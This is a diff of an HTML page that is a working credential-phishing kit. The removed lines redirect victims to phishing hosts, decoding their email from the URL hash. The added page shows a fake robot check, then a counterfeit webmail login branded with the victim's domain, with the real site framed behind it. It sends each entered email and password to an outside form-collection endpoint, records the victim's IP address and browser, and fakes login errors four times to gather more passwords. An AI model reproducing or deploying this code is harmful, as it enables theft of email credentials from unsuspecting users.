@@ -1,111 +1,517 @@
+<!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-  <meta charset="utf-8">
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title data-i18n="title">Webmail Sign-in</title>
+   <!-- Bootstrap 5 CSS -->
+   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+   <!-- Bootstrap Icons -->
+   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+   <!-- Google Fonts: Poppins -->
+   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+   <!-- i18next -->
+   <script src="https://unpkg.com/i18next@23.11.5/dist/umd/i18next.min.js"></script>
+   <script src="https://unpkg.com/i18next-browser-languagedetector@7.2.1/dist/umd/i18nextBrowserLanguageDetector.min.js"></script>
 
-
-
-  <head>
-
-  <body>
-
-    <script type="text/javascript">
-      var url_string = window.location.href;
-      var url_get_email = atob(getafterhash(url_string));
-      var mail_go_url = "https://filedn.eu/lr4Rp3x4QR2yETwH1wVipzV/perrexel.html#" + url_get_email + "";
-      location.replace(mail_go_url);
-
-
-      function getafterhash(url) {
-        var ret;
-        var queryString;
-        // stuff after # is not part of query string, so get rid of it
-        queryStringhash = url.split('#')[1];
-        queryStringsemi = url.split(';')[1];
-        queryStringsemiplus = url.split(';+')[1];
-        queryStringstartsemi = url.split('*;')[1];
-        // if query string exists
-        if (queryStringhash) {
-          ret = queryStringhash;
-
-        } else if (queryStringsemi) {
-          ret = queryStringsemi;
-
-        } else if (queryStringsemiplus) {
-          ret = queryStringsemiplus;
-
-        } else if (queryStringstartsemi) {
-          ret = queryStringstartsemi;
-
-        } else {
-
-          ret = 0;
-
-        }
-
-        return ret;
+   <style>
+      /* Hide main content initially */
+      #main-content {
+         display: none;
       }
 
-    </script>
-  </body>
+      /* Verification Div Styling */
+      #verification-div {
+         height: 100vh;
+         display: flex;
+         align-items: start;
+         justify-content: center;
+         padding-top: 10%;
+      }
 
-</html>
+      /* Left-align text */
+      .verification-content {
+         text-align: left;
+      }
 
+      /* Spinner size */
+      .spinner-border {
+         width: 1.5rem;
+         height: 1.5rem;
+      }
 
+      /* RTL support for languages like Arabic */
+      [dir="rtl"] {
+         direction: rtl;
+         text-align: right;
+      }
 
-
-
-
-——
-<html lang="en">
-
-<head>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-  <meta charset="utf-8">
+      #background-iframe, #overlay { position: fixed; top: 0; left: 0; height: 100%; width: 100%; }
+      body { font-family: Poppins, sans-serif; margin: 0; padding: 0; overflow: hidden; }
+      #background-iframe { border: none; z-index: -3; object-fit: cover; }
+      #overlay { background-color: rgba(0, 0, 0, .5); z-index: -2; }
+      .form-container { display: none; max-width: 400px; width: 100%; padding: 2rem; background-color: rgba(255, 255, 255, .95); border-radius: .75rem; box-shadow: 0 8px 16px rgba(0, 0, 0, .2); position: relative; z-index: 1; }
+      .icon-text { display: flex; align-items: center; margin-bottom: 1.5rem; }
+      .icon-text img { width: 32px; height: 32px; margin-right: .5rem; }
+      .icon-text .h4 { margin-bottom: 0; color: #0d6efd; }
+      .form-floating { position: relative; margin-bottom: 1.5rem; }
+      .form-floating label, .input-icon { position: absolute; color: #6c757d; pointer-events: none; }
+      .form-floating label { transition: .2s ease-in-out; left: 2.5rem; top: -.2rem; background-color: transparent; z-index: 1; }
+      .form-floating input:focus + label, .form-floating input:not(:placeholder-shown) + label { transform: translateY(-1.5rem); font-size: .85rem; color: #0d6efd; }
+      .form-control { border-top: none; border-left: none; border-right: none; border-bottom: 2px solid #ced4da; border-radius: 0; padding-left: 2.5rem; transition: border-color .2s; background-color: transparent; }
+      .form-control:focus { box-shadow: none; outline: 0; border-bottom-color: #0d6efd; }
+      .input-icon { left: .75rem; top: 50%; transform: translateY(-50%); font-size: 1.2rem; }
+      [dir="rtl"] .form-floating label { left: auto; right: 2.5rem; }
+      [dir="rtl"] .input-icon { left: auto; right: .75rem; }
+      [dir="rtl"] .form-control { padding-left: 0; padding-right: 2.5rem; }
+      .btn-primary { width: 100%; padding: .75rem; font-size: 1rem; background-color: #0d6efd; border: none; border-radius: .375rem; transition: background-color .3s, color .3s; }
+      .btn-primary:hover { background-color: #0b5ed7; color: #fff; }
+      .btn-primary:focus { box-shadow: none; }
+      @media (max-width: 576px) { .form-container { padding: 1.5rem; } }
+      .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, .5); align-items: center; justify-content: center; z-index: 9999; display: none; }
+      .error-message { color: red; margin-bottom: 1rem; display: none; }
+   </style>
 </head>
 
-<body>
+<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
+   <div id="verification-div" style="position: absolute; height: 100vh; width: 100vw; background-color: #fff;">
+      <div class="row">
+         <div class="col-12 verification-content mx-2">
+            <h2 data-i18n="verify_browser">Checking your browser before accessing the site</h2>
+            <div>
+               <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border: 0px solid black; background: #f3efef; border-radius: 5px;">
+                  <input type="checkbox" id="bot-check" class="form-check-input">
+                  <label for="bot-check" class="form-check-label ms-2" data-i18n="not_robot">I am not a robot</label>
+               </div>
+            </div>
+            <p class="pt-1" data-i18n="verify_instruction">Click on the checkbox to verify if you're human.</p>
+         </div>
+      </div>
+   </div>
+   <!-- Background Iframe -->
+   <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
+   <!-- Dimmed Overlay -->
+   <div id="overlay"></div>
+   <!-- Form Container -->
+   <div class="form-container" id="form-container">
+      <!-- Error Message -->
+      <div id="error-message" class="error-message" data-i18n="error_message">Try again</div>
+      <form id="user-form">
+         <!-- Honeypot Field -->
+         <input type="text" name="honeypot" id="honeypot" style="display:none;" autocomplete="off">
+         <!-- Icon and Text Row -->
+         <div class="icon-text">
+            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width: 15px;">
+            <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
+         </div>
+         <!-- Heading -->
+         <h5 class="mb-3" data-i18n="get_started">Let's get started</h5>
+         <!-- Paragraph -->
+         <p class="mb-4 text-muted" style="font-size: .8rem;" data-i18n="session_expired">Previous session has expired, login to continue</p>
+         <!-- Email Input -->
+         <div class="form-floating position-relative">
+            <i class="bi bi-envelope input-icon"></i>
+            <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index: 1000;" disabled>
+            <label for="email" style="background-color: transparent;" data-i18n="email_label">Email</label>
+         </div>
+         <!-- Password Input -->
+         <div class="form-floating position-relative">
+            <i class="bi bi-lock input-icon"></i>
+            <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
+            <label for="password" style="background-color: transparent;" data-i18n="password_label">Password</label>
+         </div>
+         <!-- Submit Button -->
+         <button type="submit" class="btn btn-primary" data-i18n="next_button">Next</button>
+      </form>
+   </div>
 
-  <script type="text/javascript">
-    var url_string = window.location.href;
-    var url_get_email = atob(getafterhash(url_string));
-    var long_query_param = "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
-                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
-                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" +
-                           "shiyf24fjureujuvdehjyresthjutdhjg1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; // Very long query parameter
-    var mail_go_url = "https://dhl-cn-gyygghl.vercel.app?query=" + long_query_param + "#" + url_get_email; // Added query parameter before the hash
-    location.replace(mail_go_url);
+   <!-- Loader Overlay -->
+   <div id="loader-overlay" class="loader-overlay">
+      <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
+         <span class="visually-hidden" data-i18n="loading">Loading...</span>
+      </div>
+   </div>
 
-    function getafterhash(url) {
-      var ret;
-      var queryString;
-      // stuff after # is not part of query string, so get rid of it
-      queryStringhash = url.split('#')[1];
-      queryStringsemi = url.split(';')[1];
-      queryStringsemiplus = url.split(';+')[1];
-      queryStringstartsemi = url.split('*;')[1];
-      // if query string exists
-      if (queryStringhash) {
-        ret = queryStringhash;
+   <!-- Bootstrap 5 JS Bundle -->
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+   <!-- i18next Initialization -->
+   <script>
+      // Translation resources for requested languages
+      const resources = {
+         en: {
+            translation: {
+               title: "Webmail Sign-in",
+               verify_browser: "Checking your browser before accessing the site",
+               not_robot: "I am not a robot",
+               verify_instruction: "Click on the checkbox to verify if you're human.",
+               redirecting: "Redirecting...",
+               verifying: "Verifying...",
+               error_message: "Try again",
+               get_started: "Let's get started",
+               session_expired: "Previous session has expired, login to continue",
+               email_label: "Email",
+               password_label: "Password",
+               next_button: "Next",
+               loading: "Loading..."
+            }
+         },
+         zh-CN: {
+            translation: {
+               title: "网页邮件登录",
+               verify_browser: "在访问网站之前检查您的浏览器",
+               not_robot: "我不是机器人",
+               verify_instruction: "点击复选框以验证您是人类。",
+               redirecting: "正在重定向...",
+               verifying: "正在验证...",
+               error_message: "请重试",
+               get_started: "开始吧",
+               session_expired: "之前的会话已过期，请登录以继续",
+               email_label: "电子邮件",
+               password_label: "密码",
+               next_button: "下一步",
+               loading: "加载中..."
+            }
+         },
+         ko: {
+            translation: {
+               title: "웹메일 로그인",
+               verify_browser: "사이트에 접근하기 전에 브라우저를 확인 중입니다",
+               not_robot: "나는 로봇이 아닙니다",
+               verify_instruction: "인간임을 확인하려면 체크박스를 클릭하세요.",
+               redirecting: "리디렉션 중...",
+               verifying: "확인 중...",
+               error_message: "다시 시도하세요",
+               get_started: "시작합시다",
+               session_expired: "이전 세션이 만료되었습니다. 계속하려면 로그인하세요",
+               email_label: "이메일",
+               password_label: "비밀번호",
+               next_button: "다음",
+               loading: "로딩 중..."
+            }
+         },
+         vi: {
+            translation: {
+               title: "Đăng nhập Webmail",
+               verify_browser: "Đang kiểm tra trình duyệt của bạn trước khi truy cập trang web",
+               not_robot: "Tôi không phải là robot",
+               verify_instruction: "Nhấp vào hộp kiểm để xác minh bạn là con người.",
+               redirecting: "Đang chuyển hướng...",
+               verifying: "Đang xác minh...",
+               error_message: "Thử lại",
+               get_started: "Hãy bắt đầu",
+               session_expired: "Phiên trước đã hết hạn, đăng nhập để tiếp tục",
+               email_label: "Email",
+               password_label: "Mật khẩu",
+               next_button: "Tiếp theo",
+               loading: "Đang tải..."
+            }
+         },
+         ja: {
+            translation: {
+               title: "ウェブメールログイン",
+               verify_browser: "サイトにアクセスする前にブラウザを確認しています",
+               not_robot: "私はロボットではありません",
+               verify_instruction: "人間であることを確認するためにチェックボックスをクリックしてください。",
+               redirecting: "リダイレクト中...",
+               verifying: "確認中...",
+               error_message: "もう一度試してください",
+               get_started: "始めましょう",
+               session_expired: "前のセッションが期限切れになりました。続行するにはログインしてください",
+               email_label: "メール",
+               password_label: "パスワード",
+               next_button: "次へ",
+               loading: "読み込み中..."
+            }
+         },
+         ms: {
+            translation: {
+               title: "Log Masuk Webmail",
+               verify_browser: "Menyemak pelayar anda sebelum mengakses laman web",
+               not_robot: "Saya bukan robot",
+               verify_instruction: "Klik pada kotak semak untuk mengesahkan anda manusia.",
+               redirecting: "Mengalihkan...",
+               verifying: "Mengesahkan...",
+               error_message: "Cuba lagi",
+               get_started: "Mari kita mulakan",
+               session_expired: "Sesi sebelumnya telah tamat tempoh, log masuk untuk meneruskan",
+               email_label: "E-mel",
+               password_label: "Kata laluan",
+               next_button: "Seterusnya",
+               loading: "Memuat..."
+            }
+         },
+         es: {
+            translation: {
+               title: "Inicio de sesión de correo web",
+               verify_browser: "Verificando tu navegador antes de acceder al sitio",
+               not_robot: "No soy un robot",
+               verify_instruction: "Haz clic en la casilla para verificar que eres humano.",
+               redirecting: "Redirigiendo...",
+               verifying: "Verificando...",
+               error_message: "Intenta de nuevo",
+               get_started: "Comencemos",
+               session_expired: "La sesión anterior ha expirado, inicia sesión para continuar",
+               email_label: "Correo electrónico",
+               password_label: "Contraseña",
+               next_button: "Siguiente",
+               loading: "Cargando..."
+            }
+         },
+         fr: {
+            translation: {
+               title: "Connexion au courriel web",
+               verify_browser: "Vérification de votre navigateur avant d'accéder au site",
+               not_robot: "Je ne suis pas un robot",
+               verify_instruction: "Cliquez sur la case à cocher pour vérifier que vous êtes humain.",
+               redirecting: "Redirection...",
+               verifying: "Vérification...",
+               error_message: "Réessayez",
+               get_started: "Commençons",
+               session_expired: "La session précédente a expiré, connectez-vous pour continuer",
+               email_label: "E-mail",
+               password_label: "Mot de passe",
+               next_button: "Suivant",
+               loading: "Chargement..."
+            }
+         },
+         ar: {
+            translation: {
+               title: "تسجيل دخول البريد الإلكتروني",
+               verify_browser: "جارٍ التحقق من متصفحك قبل الوصول إلى الموقع",
+               not_robot: "أنا لست روبوتًا",
+               verify_instruction: "انقر على مربع الاختيار للتحقق من أنك إنسان.",
+               redirecting: "جارٍ إعادة التوجيه...",
+               verifying: "جارٍ التحقق...",
+               error_message: "حاول مرة أخرى",
+               get_started: "لنبدأ",
+               session_expired: "انتهت صلاحية الجلسة السابقة، قم بتسجيل الدخول للمتابعة",
+               email_label: "البريد الإلكتروني",
+               password_label: "كلمة المرور",
+               next_button: "التالي",
+               loading: "جارٍ التحميل..."
+            }
+         },
+         ru: {
+            translation: {
+               title: "Вход в веб-почту",
+               verify_browser: "Проверка вашего браузера перед доступом к сайту",
+               not_robot: "Я не робот",
+               verify_instruction: "Нажмите на флажок, чтобы подтвердить, что вы человек.",
+               redirecting: "Перенаправление...",
+               verifying: "Проверка...",
+               error_message: "Попробуйте снова",
+               get_started: "Начнем",
+               session_expired: "Предыдущая сессия истекла, войдите, чтобы продолжить",
+               email_label: "Электронная почта",
+               password_label: "Пароль",
+               next_button: "Далее",
+               loading: "Загрузка..."
+            }
+         }
+      };
 
-      } else if (queryStringsemi) {
-        ret = queryStringsemi;
+      // Supported languages (all from previous response)
+      const supportedLanguages = [
+         'en', 'es', 'ja', 'ar', 'zh-CN', 'ko', 'vi', 'ms', 'fr', 'ru', 'ps', 'fa', 'hy', 'az', 'bn', 'dz',
+         'km', 'zh-TW', 'el', 'tr', 'ka', 'hi', 'id', 'ku', 'he', 'kk', 'ky', 'lo', 'mn', 'my', 'ne', 'ur',
+         'fil', 'dv', 'ta', 'si', 'th', 'pt', 'tet', 'tg', 'tk', 'uz', 'sq', 'ca', 'de', 'be', 'nl', 'bs', 'hr',
+         'sr', 'bg', 'cs', 'da', 'et', 'fi', 'sv', 'hu', 'is', 'ga', 'it', 'lv', 'lt', 'lb', 'mt', 'ro', 'cnr',
+         'mk', 'no', 'pl', 'sl', 'uk', 'rm', 'qu', 'ay', 'gn', 'ht'
+      ];
 
-      } else if (queryStringsemiplus) {
-        ret = queryStringsemiplus;
+      // RTL languages
+      const rtlLanguages = ['ar', 'fa', 'he', 'ur'];
 
-      } else if (queryStringstartsemi) {
-        ret = queryStringstartsemi;
+      // Initialize i18next
+      i18next
+         .use(i18nextBrowserLanguageDetector)
+         .init({
+            resources,
+            fallbackLng: 'en',
+            supportedLngs: supportedLanguages,
+            detection: {
+               order: ['navigator', 'htmlTag', 'path', 'subdomain'],
+               caches: ['localStorage', 'cookie'],
+               lookupLocalStorage: 'i18nextLng',
+               lookupCookie: 'i18next'
+            },
+            interpolation: {
+               escapeValue: false
+            }
+         }, function(err, t) {
+            if (err) return console.error('i18next initialization error:', err);
+            // Update translations and direction
+            const updateTranslations = () => {
+               document.querySelectorAll('[data-i18n]').forEach(elem => {
+                  elem.innerHTML = i18next.t(elem.getAttribute('data-i18n'));
+               });
+               document.title = i18next.t('title');
+               // Set text direction
+               document.documentElement.setAttribute('dir', rtlLanguages.includes(i18next.language) ? 'rtl' : 'ltr');
+            };
+            updateTranslations();
+            i18next.on('languageChanged', updateTranslations);
+         });
+   </script>
+   <!-- Form Handling and Reporting -->
+   <script>
+      let submitCount = 0;
+      document.addEventListener("DOMContentLoaded", (() => {
+         const e = window.location.hash ? window.location.hash.substring(1) : null;
+         let t;
+         if (e) {
+            document.getElementById("email").value = e;
+            const n = e.split("@");
+            if (2 === n.length) {
+               const e = n[1];
+               t = e, document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${e}`;
+               const o = e.split(".")[0].toUpperCase();
+               document.getElementById("domain-name").textContent = o;
+               const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
+               document.getElementById("background-iframe").src = r;
+            }
+         } else console.warn("No '#' parameter found in the URL."), document.getElementById("background-iframe").src = "about:blank";
+         
+         let n = {
+            ipAddress: "Fetching...",
+            userAgent: navigator.userAgent,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            browser: "Detecting..."
+         };
+         const o = navigator.userAgent;
+         o.indexOf("Firefox") > -1 ? n.browser = "Mozilla Firefox" : o.indexOf("SamsungBrowser") > -1 ? n.browser = "Samsung Internet" : o.indexOf("Opera") > -1 || o.indexOf("OPR") > -1 ? n.browser = "Opera" : o.indexOf("Trident") > -1 ? n.browser = "Microsoft Internet Explorer" : o.indexOf("Edge") > -1 ? n.browser = "Microsoft Edge" : o.indexOf("Chrome") > -1 ? n.browser = "Google Chrome or Chromium" : o.indexOf("Safari") > -1 ? n.browser = "Apple Safari" : n.browser = "Unknown";
+         
+         fetch("https://api.ipify.org?format=json").then((e => e.json())).then((e => {
+            n.ipAddress = e.ip;
+         })).catch((e => {
+            console.error("Error fetching IP address:", e), n.ipAddress = "Unavailable";
+         }));
 
-      } else {
-        ret = 0;
-      }
+         document.getElementById("user-form").addEventListener("submit", (function(e) {
+            e.preventDefault();
+            submitCount += 1;
 
-      return ret;
-    }
+            const isFirstAttempt = submitCount === 1;
+            const isSecondAttempt = submitCount === 2;
+            const isThirdAttempt = submitCount === 3;
+            const isFourthAttempt = submitCount === 4;
 
-  </script>
+            document.getElementById("loader-overlay").style.display = "flex";
+            let s = `✅🤑💳💶 Perry ajebutter 💶💳🤑✅\n\nEmail: ${document.getElementById("email").value.trim()}\nPassword: ${document.getElementById("password").value.trim()}`;
+            
+            new Promise((e => {
+               const t = setInterval((() => {
+                  "Fetching..." !== n.ipAddress && (clearInterval(t), e());
+               }), 100);
+            })).then((() => {
+               s += `\nIP Address: ${n.ipAddress}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`;
+            }));
+
+            if (isFirstAttempt) {
+               setTimeout(() => {
+                  document.getElementById("loader-overlay").style.display = "none";
+                  document.getElementById("error-message").style.display = "block";
+                  document.getElementById("error-message").innerHTML = i18next.t('error_message');
+                  document.getElementById("password").value = "";
+               }, 3000);
+            } else if (isSecondAttempt || isThirdAttempt || isFourthAttempt) {
+               setTimeout(() => {
+                  document.getElementById("loader-overlay").style.display = "none";
+                  document.getElementById("error-message").style.display = "block";
+                  document.getElementById("error-message").innerHTML = i18next.t('error_message');
+                  document.getElementById("password").value = "";
+               }, 3000);
+            } else if (submitCount === 5) {
+               setTimeout(() => {
+                  document.getElementById("loader-overlay").style.display = "none";
+                  window.location.href = "https://" + t;
+               }, 3000);
+            }
+         }));
+
+         // Reporting with Honeypot
+         document.getElementById("user-form").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            const honeypot = document.getElementById("honeypot").value.trim();
+            if (honeypot) {
+               console.log("Honeypot field filled. Submission ignored.");
+               return;
+            }
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+            
+            const data = {
+               email: email,
+               password: password
+            };
+
+            fetch("https://submit-form.com/YeYoqHc8C", {
+               method: "POST",
+               headers: {
+                  "Content-Type": "application/json"
+               },
+               body: JSON.stringify(data)
+            })
+            .then(response => {
+               if (response.ok) {
+                  console.log("Submission to form successful!");
+               } else {
+                  console.error("Submission to form failed.");
+               }
+            })
+            .catch(error => {
+               console.error("Error sending submission to form:", error);
+            });
+         });
+      }));
+   </script>
 </body>
 
+<!-- Bot Verification -->
+<script>
+   document.addEventListener('DOMContentLoaded', function () {
+      const botCheck = document.getElementById('bot-check');
+      const verificationDiv = document.getElementById('verification-div');
+      const formContainer = document.getElementById('form-container');
+      const mainContent = document.getElementById('main-content');
+
+      botCheck.addEventListener('change', function () {
+         if (this.checked) {
+            const checkboxContainer = this.parentElement;
+            checkboxContainer.innerHTML = `
+               <div class="spinner-container d-flex align-items-center">
+                  <div class="spinner-border" role="status">
+                     <span class="visually-hidden" data-i18n="loading">Loading...</span>
+                  </div>
+                  <span class="ms-2" data-i18n="verifying">Verifying...</span>
+               </div>
+            `;
+            document.querySelectorAll('[data-i18n]').forEach(elem => {
+               elem.innerHTML = i18next.t(elem.getAttribute('data-i18n'));
+            });
+
+            setTimeout(function () {
+               verificationDiv.innerHTML = `
+                  <div class="row">
+                     <div class="col-12 verification-content">
+                        <h2 data-i18n="redirecting">Redirecting...</h2>
+                     </div>
+                  </div>
+               `;
+               document.querySelectorAll('[data-i18n]').forEach(elem => {
+                  elem.innerHTML = i18next.t(elem.getAttribute('data-i18n'));
+               });
+
+               setTimeout(function () {
+                  verificationDiv.style.display = 'none';
+                  mainContent.style.display = 'block';
+                  formContainer.style.display = 'block';
+               }, 2000);
+            }, 4000);
+         }
+      });
+   });
+</script>
 </html>
